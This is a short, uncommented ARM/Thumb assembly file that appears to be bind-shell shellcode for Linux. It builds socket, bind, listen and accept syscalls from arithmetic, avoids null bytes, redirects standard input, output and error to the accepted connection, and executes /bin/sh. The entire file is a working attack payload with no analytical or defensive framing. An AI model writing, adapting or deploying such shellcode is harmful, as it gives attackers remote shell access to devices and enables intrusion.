.section .text
.global _start

_start:
.code 32
add r1, pc, #1
bx r1
.code 16
eor r0, r0, r0
add r1, r0, #1
add r0, r1, #1
eor r2, r2, r2
mov r7, #140
mla r7, r7, r0, r1
svc #1
str r0, [sp, #24]
mov r1, sp
add r1, #4
eor r4, r4, r4
mov r3, r4
loop:
strb r4, [r1, r2]
add r2, r2, #1
cmp r2, #16
bne loop
mov r3, #160
mov r4, #91
mov r5, #37
mla r3, r3, r4, r5
LSL r3, r3, #16
add r3, r3, #2
str r3, [sp,#4]
add r7, r7, #1
svc #1
ldr r0, [sp, #24]
mov r1, #5
add r7, r7, #2
svc #1
add r7, r7, #1
ldr r0, [sp, #24]
mov r1, sp
add r1, #4
add r2, r1, #4
add r2, r2, #4
add r2, r2, #4
add r2, r2, #4
svc #1
mov r3, r0
eor r1, r1, r1
mov r7, #63
mydup:
svc #1
add r1, r1, #1
mov r0, r3
cmp r1, #3
bne mydup
add r0, pc, #8
add r0, r0, #2
eor r1, r1, r1
eor r2, r2, r2
strb r2, [r0,#7]
mov r7, #11
svc 1
.ascii "/bin/shX"
